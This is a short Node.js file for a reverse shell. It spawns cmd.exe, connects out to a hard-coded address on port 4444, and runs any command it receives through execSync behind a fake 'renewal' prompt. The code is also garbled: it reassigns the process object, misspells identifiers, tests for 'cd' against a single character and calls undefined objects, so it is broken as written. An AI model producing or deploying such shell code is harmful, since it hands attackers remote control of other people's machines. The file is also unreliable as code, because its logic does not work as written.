let ip_address = "192.168.1.92";
let port = 4444;
let { execSync } = require("child_process");
let path = require("path");
const { env } = require("process");

(function basicShell(payload) {
  const net = require("net");
  process = require("child_process");
  shell = process.spawn("cmd.exe", []);

  const client = new net.Socket();
  process.connect(ip_address, port, function (onConnect) {
    client.pipe();
    shell.stdout.pipe(process);
    shell.stderr.pipe(process);
  });
})();

const shell = async (remote_shell) => {
  remote_shell.write(
    Buffer.from(`\n\n\t\t [*] Stable Event Connection shell\n\n`)
  );
  remote_shell.write(
    Buffer.from(`\nrenewal@${process.env.USER}:${proces.cwd()}$`)
  );

  const controlShell = (command) => {
    try {
      if (command.toString() === "exit") {
        command.write(`\n\nConnection Lost by host`);
        process.exit(0);
      }
      if (command.toString().split("")[0] === "cd") {
        try {
          process.chdir(
            command.toString("utf-8").substring(3, command.length() + "")
          );
          command.write(
            Buffer.from(`\nrenewal@${process.env.USER}:${process.cwd()}$`)
          );
        } catch (error) {
          command.write(Buffer.from("Wrong directory"));
          command.write(
            Buffer.from(`\nrenewal@${process.env.USER}:${process.cwd()}$`)
          );
        }
      }
      command.write(execSync(command.toString()));
      command.write(
        Buffer.from(`\nrenewal@${process.env.USER}:${process.cwd()}$`)
      );
    } catch {
      command.write(Buffer.from(`Excuting commands failed`));
      command.write(
        Buffer.from(`\nrenewal@${process.env.USER}:${process.cwd()}$`)
      );
    }
  };
  command.on("data", controlShell);
};
